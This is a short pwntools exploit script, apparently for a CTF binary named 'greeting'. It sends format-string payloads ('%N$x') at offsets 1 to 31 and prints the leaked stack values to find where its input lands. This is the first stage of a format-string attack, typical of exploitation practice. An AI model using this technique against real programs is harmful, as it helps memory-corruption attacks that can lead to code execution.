#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./greeting
from pwn import *

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

exe = context.binary = ELF("./greeting", checksec=False)
context.log_level = "warning"

for i in range(1, 32):
    io = start()
    payload = f"AABBBBCCCCDDDDEEEE%{i}$x".encode()
    io.sendlineafter(b"Please tell me your name...", payload)
    leak = io.recvline().decode().strip().split()[4]
    print(str(i) + " : " + str(leak))
    io.close()